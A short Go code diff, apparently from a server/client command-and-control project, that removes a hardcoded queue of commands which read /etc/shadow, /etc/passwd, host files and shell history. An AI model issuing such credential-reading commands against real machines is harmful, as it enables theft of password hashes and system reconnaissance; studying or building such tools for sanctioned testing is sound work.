@@ -4,34 +4,8 @@ import (
 	"flag"
 	"log"
 
-	"github.com/quietjoy/gocom/pkg/models"
 	"github.com/quietjoy/gocom/pkg/modes"
 )
-
-func initializeCommandQueue() []models.ControlCommand {
-	return []models.ControlCommand{
-		{
-			Command:   "cat",
-			Arguments: "/etc/shadow",
-		},
-		{
-			Command:   "cat",
-			Arguments: "/etc/passwd",
-		},
-		{
-			Command:   "cat",
-			Arguments: "/etc/hosts",
-		},
-		{
-			Command:   "cat",
-			Arguments: "/etc/hostname",
-		},
-		{
-			Command:   "history",
-			Arguments: "",
-		},
-	}
-}
 
 func main() {
 	mode := flag.String("mode", "", "[server/client] Determines mode program is run in")
